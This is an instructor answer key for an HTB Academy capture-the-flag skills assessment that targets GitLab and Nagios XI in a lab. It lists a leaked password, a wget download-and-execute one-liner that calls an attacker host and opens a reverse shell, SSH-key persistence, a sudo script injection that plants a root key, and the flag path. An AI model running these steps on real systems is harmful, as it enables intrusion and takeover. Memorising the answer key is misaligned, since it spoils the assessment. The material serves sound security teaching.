---
id: B02.M15-key
title: Access Group Exercise — Instructor Answer Key
artifact_type: answer_key
audience: instructor
block: B02
module_type: group_activity
legacy_aliases: []
source_status: canonical
review_required: false
output_formats:
- docx
- pdf
template_profile: answer_key_v1
sensitivity: instructor_only
---

# Access Group Exercise — Instructor Answer Key

## Objective and starting context

Live instructor path for HTB Academy **Attacking Common Applications - Skills Assessment II**. Students work only against the spawned HTB target. Facilitation lives in [`instructor-guide.md`](instructor-guide.md).

## Flag / reference table

| Item | Value |
| --- | --- |
| HTB course | Attacking Common Applications |
| Component | Skills Assessment II |
| Target (example) | `10.129.1.40` / `gitlab.inlanefreight.local` — confirm the live spawned IP |
| Answers | HTB question values recovered from the target; grade the live instance |

Do not hand students the hostnames, credentials, or flag path from this walkthrough.

## Initial situational awareness

On the ops station, before touching the HTB target:

```bash
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
ss -tulpen
ip -4 route
```

Then confirm the spawned target IP and map hostnames only after the student brief / HTB lab card shows them.

## Instructor live walkthrough

### Instructor Guide: Attacking Common Applications II

**Target Environment:** `10.129.1.40` | `gitlab.inlanefreight.local`

#### Phase 1: Initial Access and Reconnaissance

The objective of this phase is to establish a working environment and identify hidden subdomains through version control history.

1. **Environment Setup:**
    
    Instruct students to set environment variables to streamline command execution and map the target IP to the known hostname in `/etc/hosts`.
    
    Bash
    
    ```
    export TGT=10.129.1.40
    export SRC=$(ip route get $TGT | grep -o 'src [^ ]*' | awk '{print $NF}')
    echo "$TGT gitlab.inlanefreight.local" | sudo tee -a /etc/hosts
    ```
    
2. **Git Repository Inspection:**
    
    Instruct students to browse to the GitLab instance on port 80. Note that the application redirects to an alternate port (8080/8180).
    
    - **Instructor Note:** When the site loads, it presents a standard login screen. Emphasize to the students that they should not stop here; by clicking around the interface, they can discover public repositories without needing credentials.
        
    - **Action:** Clone the discovered repository locally: `git clone http://gitlab.inlanefreight.local:8180/root/virtualhost.git`
        
    - **Action:** Run `git log -p` inside the cloned directory.
        
    - **Context:** Explain that `git log` normally just shows the commit metadata (author, date, message). Adding the `-p` (or `--patch`) flag displays the actual line-by-line differences (the code that was added or removed) for each commit, which is how we spot the leaked subdomain.
        
3. **Subdomain Mapping:**
    
    Update the local hosts file to include the newly discovered `monitoring` domain found in the commit history.
    
    Bash
    
    ```
    echo "$TGT monitoring.inlanefreight.local" | sudo tee -a /etc/hosts
    ```
    

---

#### Phase 2: Credential Harvesting

This phase focuses on exploiting weak registration policies to access internal repositories.

1. **Account Creation (The Risk):**
    
    We are taking a calculated risk by attempting to create an account on the GitLab instance. We do not know if open registration is enabled before trying, but testing this is a critical step in assessing application misconfigurations.
    
    - **Action:** Register a new user account. No email validation is required, granting immediate access.
        
2. **Discovery of Sensitive Repositories:**
    
    Once logged in, a second repository becomes visible: `nagios-postgresql.git`.
    
    - **Action:** Clone the repo and run `git log -p`.
        
    - **Findings:** The patch history reveals a database user creation script where a password was updated to: `oilaKglm7M09@CPL&^lC` for the user `nagiosadmin`.
        

---

#### Phase 3: Exploitation (Remote Code Execution)

Since Nagios is an infrastructure monitoring tool designed to execute plugins and scripts across systems, we assume that if we have administrative access, we will find a way to execute a 1-liner for code execution. Therefore, we will get Metasploit ready first.

1. **Payload Generation (Metasploit):**
    
    We use the `web_delivery` module to host a payload that the target will download and execute in memory.
    
    - **Module:** `use exploit/multi/script/web_delivery`
        
    - **Options:** Set `LHOST`, `LPORT`, and set target to `7` (Linux).
        
    - **Command generated:** `wget -qO HzbxDaUT --no-check-certificate http://10.10.16.2:8080/Er0szbp1U; chmod +x HzbxDaUT; ./HzbxDaUT& disown`
        
2. **Accessing Nagios:**
    
    Navigate to `http://monitoring.inlanefreight.local` and authenticate using the `nagiosadmin` credentials.
    
3. **Command Injection in Nagios XI:**
    
    Navigate to **Configure -> Core Configuration Manager (CCM) -> Commands**.
    
    - **Execution:** Create a new command. The raw `wget` command string must be wrapped in `/bin/bash -c '...'`. This is **required**, not a recommendation. Without it, the Nagios execution environment will likely fail to parse the chained commands (`;`, `&`) correctly, causing the exploit to fail.
        
    - **Command Format:** `/bin/bash -c 'wget -qO [FILE] ... ; chmod +x [FILE]; ./[FILE]& disown'`
        
4. **Activation and Callback Management:**
    
    - **The 5.7.5 Caveat:** I think it is vital to warn students **not** to use the "Run Check Command" or "Test Check Command" button to test their payload. In Nagios XI 5.7.5, the UI's test function passes input through a PHP escaping function that will mangle our bash syntax and cause the exploit to silently fail.
        
    - **Activation:** To properly execute the payload, assign the new command to a host or service (e.g., Localhost), save it, and click **Apply Configuration**. Explain that clicking "Apply Configuration" exports the database entries into flat text files and restarts the Nagios Core engine to load the new config into production.
        
    - **The Callback Loop:** Because the command is now tied to a live monitoring check, Nagios will execute it automatically every time the check interval occurs, resulting in multiple incoming shells.
        
    - **Catch and Kill:** To stop the loop, students should navigate to **Home -> Service Detail** and click **Schedule a forced immediate check** to instantly trigger the payload and catch the reverse shell. Once the shell is established, they must immediately return to the CCM, remove the malicious command from the service, and click **Apply Configuration** again to stop further callbacks.
        

---

#### Phase 4: Persistence and Privilege Escalation

This phase breaks down how we establish a stable backdoor and abuse misconfigured system permissions to gain root access. Ensure students understand the "why" behind each of these steps.

1. **SSH Persistence:**
    
    Reverse shells can be unstable and drop unexpectedly. To secure our access, we place an SSH public key into the compromised user's directory.
    
    Bash
    
    ```
    mkdir -p $HOME/.ssh
    echo 'ssh-ed25519 AAAAC3... kali@kali' >> $HOME/.ssh/authorized_keys
    ```
    
    Students can now log in securely: `ssh -i ~/.ssh/id_ed25519 nagios@10.129.1.40`
    
2. **Sudo Enumeration:**
    
    Run `sudo -l` to see what privileges the `nagios` user has.
    
    - **Explanation:** `sudo` allows a permitted user to execute a command as the superuser (root). The `NOPASSWD` tag in the output means the `nagios` user can run the listed scripts as root without being prompted for a password.
        
3. **Identifying the Vulnerable Script:**
    
    We need to check the file permissions of the scripts listed in the `sudo -l` output to see if we can modify any of them.
    
    - **Command:** `ls -lart` or `stat /usr/local/nagiosxi/scripts/send_to_nls.php`
        
    - **Explanation:** The output shows `-rwxr-xr-x 1 nagios nagios`. This means the file is owned by the `nagios` user. Because we are currently logged in as `nagios`, we have write (`w`) permissions to alter the contents of this file.
        
4. **Escalation to Root:**
    
    Because we can edit the file, and we can run the file as root via `sudo`, we can force the script to execute malicious commands with root privileges.
    
    - **Action:** We append a PHP `exec()` function to the end of the script. This function executes an external program.
        
    - **Injected Code:** `echo 'exec("bash -c \"echo '\''ssh-ed25519 AAAAC3... kali@kali'\'' >> /root/.ssh/authorized_keys\"", $out, $rc);' >> /usr/local/nagiosxi/scripts/send_to_nls.php`
        
    - **Explanation:** When we trigger the script using `sudo /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php`, it runs as root. The injected `exec` command takes our public SSH key and appends it to the `authorized_keys` file in the `/root/` directory. This permanently grants us SSH access as the root user.
        

---

#### Phase 5: Final Objectives and Flag Recovery

1. **Root Access:**
    
    Log in as root using the injected key:
    
    Bash
    
    ```
    ssh -i ~/.ssh/id_ed25519 root@monitoring.inlanefreight.local
    ```
    
2. **Flag Location:**
    
    Bash
    
    ```
    find / -name "*flag.txt*" 2>/dev/null
    ```
    
    _Output:_ `/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt`
    
3. **Post-Exploit Analysis (Question 1):**
    
    To answer the assessment's specific question regarding the wordpress blog, we follow a precise enumeration path:
    
    - **Step A:** Determine the service listening on port 80 to know where to look for configurations.
        
        Bash
        
        ```
        ss -lntp | grep ':80 '
        ```
        
        _Result:_ Apache2.
        
    - **Step B:** Knowing it is Apache, list the contents of its configuration directory to find the specific config file path.
        
        Bash
        
        ```
        ls -lart /etc/apache2/sites-enabled/
        ```
        
    - **Step C:** Read the configuration file to extract the final host and directory path.
        
        Bash
        
        ```
        cat /etc/apache2/sites-enabled/blog.inlanefreight.local.conf
        ```
        
        _Result:_ The host is `blog.inlanefreight.local`. There are no redirects or SSL configured, confirming the final URL is `http://blog.inlanefreight.local`.


## Troubleshooting / confirmation

- If GitLab shows only a login screen, redirect teams to browse public projects rather than stopping at authentication.
- If the Nagios payload fails silently, confirm they did **not** use "Run Check Command" / "Test Check Command" on XI 5.7.5 and that the wget one-liner is wrapped in `/bin/bash -c '...'`.
- If reverse shells loop, they must Apply Configuration after removing the malicious command.
- Re-confirm the spawned target IP; example addresses in this file may not match the live HTB instance.

## Grading checkpoints

This Module is ungraded. Use the checkpoints as debrief standards from the student brief.

| Checkpoint | Acceptable evidence |
| --- | --- |
| HTB answers | Every Skills Assessment II question answered from target evidence |
| Path summary | Initial access to final answer explained as a decision chain |
| Evidence | Commands, screenshots, file paths, repo findings, or config snippets for each answer |
| Lesson taken | Short note on the most important technique or mistake |
